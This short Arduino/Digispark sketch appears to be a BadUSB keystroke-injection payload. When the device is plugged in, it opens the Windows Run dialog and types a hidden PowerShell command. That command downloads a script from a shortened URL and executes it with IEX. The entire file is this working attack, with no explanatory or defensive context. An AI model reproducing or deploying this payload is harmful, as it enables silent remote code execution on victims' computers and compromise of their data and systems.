#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.print("powershell.exe -windowstyle hidden -command \"$w=New-Object net.webclient; $c=$w.DownloadString('https://tinyurl.com/yb4obe8o'); IEX $c;\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);}
void loop() {}
